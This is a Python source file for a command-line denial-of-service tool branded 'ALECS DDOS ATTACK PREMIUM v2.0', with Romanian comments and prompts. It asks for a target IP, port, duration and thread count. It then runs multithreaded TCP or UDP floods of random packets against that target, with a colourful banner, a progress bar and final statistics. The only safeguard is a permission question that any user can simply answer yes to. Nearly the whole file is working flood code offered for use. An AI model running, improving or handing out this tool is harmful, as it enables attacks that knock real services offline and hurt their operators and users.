import socket
import time
import sys
import os
import threading
import random
import logging
import ipaddress
from typing import List, Tuple
from datetime import datetime
from colorama import init, Fore, Back, Style

# Inițializare colorama
init(autoreset=True)

# Configurare logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ddos.log'),
        logging.StreamHandler(sys.stdout)
    ]
)

# Banner animat
BANNER = f"""{Fore.RED}
╔══════════════════════════════════════════════════════════════════════════╗
║{Fore.CYAN}                     ALECS DDOS ATTACK PREMIUM v2.0                    {Fore.RED}║
║{Fore.YELLOW}                        *** SUPER PREMIUM ***                         {Fore.RED}║
║                                                                          ║
║{Fore.GREEN}  Author: ALECS                                                       {Fore.RED}║
║{Fore.CYAN}  Version: PREMIUM v2.0                                               {Fore.RED}║
║{Fore.YELLOW}  Copyright © 2024 ALECS Security Labs                                {Fore.RED}║
║{Fore.MAGENTA}  *** CEL MAI PUTERNIC TOOL DE DDOS DIN ROMANIA ***                 {Fore.RED}║
╚══════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

def is_valid_ip(ip: str) -> bool:
    """Verifică dacă adresa IP este validă."""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def test_connection(ip: str, port: int) -> Tuple[bool, str]:
    """Testează conexiunea la țintă înainte de atac."""
    try:
        # Test TCP
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, port))
        sock.close()
        
        if result == 0:
            return True, "Conexiune reușită!"
        else:
            # Test UDP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            sock.sendto(b"test", (ip, port))
            sock.close()
            return True, "Port închis, dar host accesibil."
            
    except socket.gaierror:
        return False, "Nu s-a putut rezolva adresa IP."
    except socket.error as e:
        return False, f"Eroare de conexiune: {str(e)}"
    except Exception as e:
        return False, f"Eroare neașteptată: {str(e)}"

def loading_animation(duration: int = 3):
    """Afișează o animație de loading."""
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    start_time = time.time()
    i = 0
    
    while time.time() - start_time < duration:
        color = colors[i % len(colors)]
        char = chars[i % len(chars)]
        sys.stdout.write(f'\r{color}[*] Inițializare ALECS PREMIUM... {char}')
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    print(f"\n{Fore.GREEN}[✓] Sistem ALECS PREMIUM Inițializat cu Succes!{Style.RESET_ALL}")

class DDoSAttack:
    def __init__(self, target_ip: str, target_port: int, duration: int, threads: int = 10):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.num_threads = threads
        self.packets_sent = 0
        self.is_running = False
        self.start_time = None
        self.threads: List[threading.Thread] = []
        self.lock = threading.Lock()
        self.errors = 0

    def tcp_flood(self):
        """Metodă de atac TCP flood."""
        while self.is_running and time.time() - self.start_time < self.duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_ip, self.target_port))
                sock.send(os.urandom(1024))
                with self.lock:
                    self.packets_sent += 1
                sock.close()
            except socket.error:
                with self.lock:
                    self.errors += 1
                continue
            except Exception as e:
                logging.error(f"Eroare TCP flood: {str(e)}")
                with self.lock:
                    self.errors += 1
                continue
            time.sleep(0.1)

    def udp_flood(self):
        """Metodă de atac UDP flood."""
        while self.is_running and time.time() - self.start_time < self.duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(os.urandom(1024), (self.target_ip, self.target_port))
                with self.lock:
                    self.packets_sent += 1
            except Exception as e:
                logging.error(f"Eroare UDP flood: {str(e)}")
                with self.lock:
                    self.errors += 1
                continue
            time.sleep(0.1)

    def start_attack(self, method: str = "TCP"):
        """Pornește atacul cu metoda specificată."""
        print(f"\n{Fore.YELLOW}[*] Inițializare atac...")
        print(f"{Fore.CYAN}[*] Target: {Fore.WHITE}{self.target_ip}:{self.target_port}")
        print(f"{Fore.CYAN}[*] Metodă: {Fore.WHITE}{method}")
        print(f"{Fore.CYAN}[*] Durată: {Fore.WHITE}{self.duration} secunde")
        print(f"{Fore.CYAN}[*] Thread-uri: {Fore.WHITE}{self.num_threads}")
        
        # Test conexiune
        print(f"\n{Fore.YELLOW}[*] Se testează conexiunea la țintă...")
        success, message = test_connection(self.target_ip, self.target_port)
        if not success:
            print(f"{Fore.RED}[!] {message}")
            return
        print(f"{Fore.GREEN}[✓] {message}")
        
        # Countdown animat
        for i in range(3, 0, -1):
            print(f"{Fore.RED}[*] Atac începe în {i}...{Style.RESET_ALL}")
            time.sleep(1)
        
        self.is_running = True
        self.start_time = time.time()
        
        # Selectare metodă de atac
        attack_method = self.tcp_flood if method == "TCP" else self.udp_flood
        
        # Pornire thread-uri
        for _ in range(self.num_threads):
            thread = threading.Thread(target=attack_method)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        try:
            while time.time() - self.start_time < self.duration:
                elapsed = time.time() - self.start_time
                rate = self.packets_sent / elapsed if elapsed > 0 else 0
                progress = (elapsed / self.duration) * 100
                
                # Bara de progres colorată
                bar_length = 30
                filled = int(bar_length * progress / 100)
                bar_color = Fore.GREEN if progress < 60 else Fore.YELLOW if progress < 90 else Fore.RED
                bar = f"{bar_color}{'█' * filled}{Fore.WHITE}{'░' * (bar_length - filled)}"
                
                status = "⚡" if rate > 100 else "✨" if rate > 50 else "✓"
                print(f"\r{bar} {Fore.CYAN}{progress:.1f}% | {Fore.YELLOW}Pachete: {self.packets_sent} | {Fore.GREEN}Rată: {rate:.2f} p/s | {Fore.RED}Erori: {self.errors} {status}", end="")
                sys.stdout.flush()
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Atac întrerupt de utilizator")
        
        finally:
            self.stop_attack()
            self.show_stats()

    def stop_attack(self):
        """Oprește atacul și așteaptă terminarea thread-urilor."""
        self.is_running = False
        for thread in self.threads:
            thread.join(timeout=1)

    def show_stats(self):
        """Afișează statisticile atacului."""
        total_time = time.time() - self.start_time
        rate = self.packets_sent / total_time if total_time > 0 else 0
        success_rate = (self.packets_sent / (self.packets_sent + self.errors) * 100) if (self.packets_sent + self.errors) > 0 else 0
        
        print(f"\n\n{Fore.RED}╔═══════ RAPORT FINAL ALECS PREMIUM ═══════╗")
        print(f"{Fore.RED}║ {Fore.CYAN}Target: {Fore.WHITE}{self.target_ip}:{self.target_port}")
        print(f"{Fore.RED}║ {Fore.CYAN}Pachete Trimise: {Fore.WHITE}{self.packets_sent}")
        print(f"{Fore.RED}║ {Fore.CYAN}Erori: {Fore.WHITE}{self.errors}")
        print(f"{Fore.RED}║ {Fore.CYAN}Durată: {Fore.WHITE}{total_time:.2f} secunde")
        print(f"{Fore.RED}║ {Fore.CYAN}Rată: {Fore.WHITE}{rate:.2f} pachete/secundă")
        print(f"{Fore.RED}║ {Fore.CYAN}Succes Rate: {Fore.WHITE}{success_rate:.2f}%")
        print(f"{Fore.RED}╚════════════════════════════════════╝{Style.RESET_ALL}")

def main():
    try:
        # Afișare banner și animație
        print(BANNER)
        loading_animation()
        
        print(f"\n{Fore.RED}[!] ATENȚIE: Acest script este proprietatea ALECS Security Labs!")
        print(f"{Fore.RED}[!] Utilizarea neautorizată este strict interzisă!{Style.RESET_ALL}")
        
        # Confirmare utilizare etică
        confirm = input(f"\n{Fore.CYAN}Aveți permisiunea să testați această țintă? (da/nu): {Fore.WHITE}").lower()
        if confirm != "da":
            print(f"{Fore.RED}[!] Acces refuzat")
            return
        
        while True:
            # Colectare parametri
            target_ip = input(f"{Fore.CYAN}Target IP: {Fore.WHITE}")
            if not is_valid_ip(target_ip):
                print(f"{Fore.RED}[!] Adresă IP invalidă! Introduceți o adresă IP validă (ex: 192.168.1.1)")
                continue
            break
            
        while True:
            try:
                target_port = int(input(f"{Fore.CYAN}Target Port: {Fore.WHITE}"))
                if not (0 <= target_port <= 65535):
                    print(f"{Fore.RED}[!] Port invalid! Introduceți un port între 0 și 65535")
                    continue
                break
            except ValueError:
                print(f"{Fore.RED}[!] Port invalid! Introduceți un număr întreg")
        
        while True:
            try:
                duration = int(input(f"{Fore.CYAN}Durată (secunde): {Fore.WHITE}"))
                if duration <= 0:
                    print(f"{Fore.RED}[!] Durata trebuie să fie pozitivă!")
                    continue
                break
            except ValueError:
                print(f"{Fore.RED}[!] Durată invalidă! Introduceți un număr întreg")
        
        while True:
            try:
                threads = int(input(f"{Fore.CYAN}Număr de thread-uri (default 10): {Fore.WHITE}") or "10")
                if threads <= 0:
                    print(f"{Fore.RED}[!] Numărul de thread-uri trebuie să fie pozitiv!")
                    continue
                break
            except ValueError:
                print(f"{Fore.RED}[!] Valoare invalidă! Introduceți un număr întreg")
        
        print(f"\n{Fore.YELLOW}Metode disponibile:")
        print(f"{Fore.WHITE}1. TCP FLOOD")
        print(f"{Fore.WHITE}2. UDP FLOOD")
        method_choice = input(f"{Fore.CYAN}Alegeți metoda (1-2) [default: 1]: {Fore.WHITE}") or "1"
        method = "TCP" if method_choice == "1" else "UDP"
        
        # Inițiere atac
        attack = DDoSAttack(target_ip, target_port, duration, threads)
        attack.start_attack(method)
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Program întrerupt de utilizator")
    except ValueError as e:
        print(f"\n{Fore.RED}[!] Eroare: Valoare invalidă introdusă - {str(e)}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Eroare neașteptată: {str(e)}")
        logging.error(f"Eroare neașteptată: {str(e)}")

if __name__ == "__main__":
    main() 